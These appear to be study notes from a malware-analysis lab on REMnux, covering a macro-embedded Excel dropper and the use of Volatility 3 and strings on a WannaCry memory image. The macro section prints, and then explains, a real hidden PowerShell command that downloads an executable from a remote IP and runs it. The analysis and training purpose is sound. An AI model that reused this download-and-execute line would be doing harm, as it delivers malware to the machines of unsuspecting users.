# REMnux: Getting Started

## Overview

REMnux is a specialised Linux distribution built for malware analysis. It comes pre-loaded with tools like Volatility, YARA, Wireshark, oledump, and INetSim, providing a ready-to-use lab environment for dissecting potentially malicious software without putting a primary system at risk. This room covers two key workflows: analysing a malicious macro-embedded document to understand its payload delivery chain, and preprocessing a Windows memory image using Volatility 3 for incident investigation.

---

## Topics Covered

- What REMnux is and why it is used
- Analysing a malicious Excel macro (VBA + PowerShell dropper chain)
- Volatility 3: Windows memory analysis plugins
- Batch preprocessing memory images with Volatility
- Extracting strings from memory images with the `strings` utility

---

## Key Concepts

### What is REMnux?

REMnux is a purpose-built Linux distribution for reverse engineering and malware analysis. It eliminates the manual work of setting up a malware analysis environment — tools are pre-installed and configured. It provides a sandboxed environment where potentially malicious files can be examined safely without risk to the analyst's primary machine.

Included tools include: Volatility, YARA, Wireshark, oledump, INetSim, PEiD, Ghidra, and many more.

---

### Malicious Document Analysis: VBA Macro Dropper

A common malware delivery technique is embedding a VBA macro inside a document (e.g. `.xlsm`, `.docm`). When the document is opened and macros are enabled, the VBA script executes silently.

#### Sample Malicious Macro Payload (PowerShell Dropper)

The macro triggers a PowerShell command:

```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
$TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } -PassThru;
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
Start-Process $TempFile;
```

#### Command-by-Command Breakdown

| Component | Description |
|-----------|-------------|
| `-WindowStyle hidden` | Runs PowerShell with no visible window — the user sees nothing |
| `-executionpolicy bypass` | Overrides PowerShell's default script execution restrictions temporarily |
| `[IO.Path]::GetTempFileName()` | Creates a temporary file in the system temp directory |
| `Rename-Item ... -replace 'tmp$', 'exe'` | Renames the temp file with a `.exe` extension |
| `Invoke-WebRequest -Uri "..."` | Downloads a file from the specified URL |
| `-OutFile $TempFile` | Saves the downloaded file to the renamed temp path |
| `Start-Process $TempFile` | Executes the downloaded binary |

**What this attack chain does:**
1. User opens `agenttesla.xlsm` and enables macros
2. VBA macro runs silently in the background
3. PowerShell is launched hidden with execution policy bypassed
4. `Doc-3737122pdf.exe` is downloaded from a remote attacker-controlled server
5. The downloaded binary is saved to a temp path and executed immediately

This technique — embedding a downloader in a macro to fetch a second-stage payload — is designed to evade early detection. The document itself contains no malicious binary; only a script that fetches it at runtime.

---

### Memory Forensics with Volatility 3

**Volatility 3** is an open-source memory analysis framework. It extracts artefacts from memory (RAM) images using plugins. REMnux ships with Volatility 3 pre-installed.

Basic syntax:
```bash
vol3 -f [memory_image] [plugin]
```

Navigate to the working directory and run as root:
```bash
sudo su
cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/
```

---

### Volatility 3 Windows Plugins

| Plugin | Command | Description |
|--------|---------|-------------|
| PsTree | `vol3 -f wcry.mem windows.pstree.PsTree` | Lists all processes in a parent-child tree view |
| PsList | `vol3 -f wcry.mem windows.pslist.PsList` | Lists all active processes at the time of capture |
| CmdLine | `vol3 -f wcry.mem windows.cmdline.CmdLine` | Shows command-line arguments for each process |
| FileScan | `vol3 -f wcry.mem windows.filescan.FileScan` | Scans for file objects referenced in memory (1400+ results for WannaCry) |
| DllList | `vol3 -f wcry.mem windows.dlllist.DllList` | Lists all loaded DLLs for each process |
| PsScan | `vol3 -f wcry.mem windows.psscan.PsScan` | Scans for process structures in memory — catches hidden/unlinked processes |
| Malfind | `vol3 -f wcry.mem windows.malfind.Malfind` | Identifies memory regions with suspicious characteristics (RWX permissions, injected code) |

**PsTree vs PsScan:**
- `PsTree` / `PsList` list processes from the active process list — can be manipulated by rootkits
- `PsScan` scans raw memory for EPROCESS structures — finds processes that have been unlinked from the list to evade standard enumeration

---

### Batch Preprocessing with a Loop

Instead of running each plugin individually, preprocess all plugins at once and save their output to text files:

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

**Breakdown:**
- `for plugin in ...` — iterates through each plugin name
- `vol3 -q` — quiet mode, suppresses progress output
- `-f wcry.mem` — specifies the memory image file
- `> wcry.$plugin.txt` — saves output to a named text file per plugin
- `done` — ends the loop

This produces one text file per plugin (e.g. `wcry.windows.malfind.Malfind.txt`) in the working directory. Any analyst can then search or grep these files without re-running Volatility.

---

### String Extraction from Memory Images

The `strings` utility extracts printable text from binary files. Running it against a memory image can reveal embedded URLs, domain names, file paths, command strings, and other readable artefacts.

Three encoding passes are standard:

```bash
# ASCII strings
strings wcry.mem > wcry.strings.ascii.txt

# 16-bit Unicode (little-endian) — common in Windows
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt

# 16-bit Unicode (big-endian)
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

| Command | What it extracts |
|---------|----------------|
| `strings` | Standard 7-bit ASCII printable strings |
| `strings -e l` | 16-bit little-endian strings (Windows UNICODE) |
| `strings -e b` | 16-bit big-endian strings |

Running all three passes covers the full range of string encodings used in Windows memory and ensures readable artefacts are not missed due to encoding differences.

---

## Important Terminology

| Term | Meaning |
|------|---------|
| REMnux | Malware analysis Linux distribution with pre-installed tools |
| VBA | Visual Basic for Applications — scripting language embedded in Office documents |
| Macro | A script embedded in an Office document that executes when enabled |
| Dropper | Malware that downloads and executes a second-stage payload |
| Memory image | A bit-for-bit snapshot of a system's RAM at a point in time |
| Volatility | Open-source memory forensics framework |
| Plugin | A Volatility module that extracts a specific type of artefact from memory |
| PsScan | Volatility plugin that finds processes by scanning memory structures directly |
| Malfind | Volatility plugin that identifies memory regions potentially containing injected code |
| Preprocessing | Running analysis tools in advance and saving output for later investigation |
| `strings` | Linux utility for extracting printable text from binary files |
| Little-endian | Byte order where the least significant byte is stored first (common in x86/Windows) |

---

## Workflow / Process

```
Document Analysis:
  Receive suspicious document (e.g. .xlsm with macros)
          |
          v
  Examine macro content (oledump, manual inspection)
          |
          v
  Identify embedded PowerShell or other dropper command
          |
          v
  Analyse command: download URL, execution method, evasion techniques
          |
          v
  Block the C2 domain/IP, hunt for the second-stage binary

Memory Image Analysis:
  Receive memory image from a compromised system
          |
          v
  Navigate to image directory in REMnux
          |
          v
  Run Volatility batch loop to preprocess all plugins → save to .txt files
          |
          v
  Run strings (ASCII, little-endian, big-endian) → save to .txt files
          |
          v
  Analyst investigates preprocessed files:
    - grep for suspicious process names
    - grep for known malware IOCs in strings
    - Review PsScan for hidden processes
    - Review Malfind for injected memory regions
```

---

## Real-World Relevance

- Macro-embedded droppers (VBA + PowerShell) remain one of the most prevalent malware delivery methods in phishing campaigns — the `agenttesla.xlsm` example mirrors real-world Agent Tesla delivery
- The `-WindowStyle hidden -executionpolicy bypass` PowerShell pattern is a well-known attacker technique and is a common detection rule in SIEMs and EDR solutions
- Volatility is the standard tool for Windows memory forensics in DFIR engagements — `PsScan`, `Malfind`, and `CmdLine` are among the first plugins run on any memory image during incident response
- `Malfind` is specifically valuable for detecting process injection — a technique used by many advanced malware families to hide code inside legitimate processes
- Batch preprocessing memory images (loop + `strings`) is standard practice in professional DFIR workflows — it enables parallel analysis by multiple team members without re-running tools
- REMnux provides a controlled environment for all of this analysis — running malware analysis on a production machine or without isolation is a significant security risk

---

## Key Learnings

- REMnux is a pre-built, isolated malware analysis Linux environment
- VBA macro droppers use PowerShell (`-WindowStyle hidden`, `-executionpolicy bypass`, `Invoke-WebRequest`) to silently download and execute second-stage payloads
- Volatility 3 analyses Windows memory images using plugins — each plugin extracts a specific artefact type
- `PsScan` finds hidden/unlinked processes; `Malfind` identifies injected memory regions
- Batch Volatility processing with a shell loop saves output to per-plugin text files for efficient analysis
- Running `strings` in ASCII, little-endian, and big-endian modes extracts all readable text from a memory image

---

## Additional Notes

- Volatility 3 syntax differs from Volatility 2 — the plugin format is `windows.plugin.PluginName` rather than `--plugin=plugin`
- `FileScan` output can be thousands of lines — pipe through `grep` to filter for specific paths or extensions
- `Malfind` can produce false positives — JIT-compiled code (e.g. .NET, Java) can appear suspicious. Manual review of flagged regions is still required
- `strings` output alone is not analysis — it is a starting point. Useful strings (URLs, IPs, paths, registry keys) must be identified and investigated in context
- The `-q` (quiet) flag in the Volatility batch loop suppresses progress bar output — makes log files cleaner

---

## Conclusion

REMnux provides a complete, ready-to-use environment for malware analysis and memory forensics. Understanding how macro-based dropper chains work — from VBA to PowerShell to second-stage payload — and how to systematically extract and preprocess artefacts from memory images with Volatility and `strings` are core DFIR skills. The preprocessing workflow in particular reflects professional incident response practice: get the data extracted and organised first, then investigate efficiently.
